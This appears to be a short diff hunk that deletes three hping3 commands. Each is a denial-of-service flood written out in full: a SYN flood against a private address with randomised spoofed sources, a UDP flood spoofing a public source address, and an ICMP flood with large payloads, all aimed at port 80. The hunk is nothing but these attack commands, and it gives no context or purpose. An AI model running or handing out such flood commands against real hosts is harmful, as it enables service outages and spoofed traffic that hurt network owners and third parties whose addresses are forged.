@@ -1,3 +1,0 @@
-sudo hping3 -S 192.168.1.100 -p 80 --flood -c 10000 --rand-source
-sudo hping3 -2 -a 159.89.114.45 -p 80 --flood -c 9000
-sudo hping3 -1 -d 1024 -p 80 --flood -c 11000 192.168.1.100
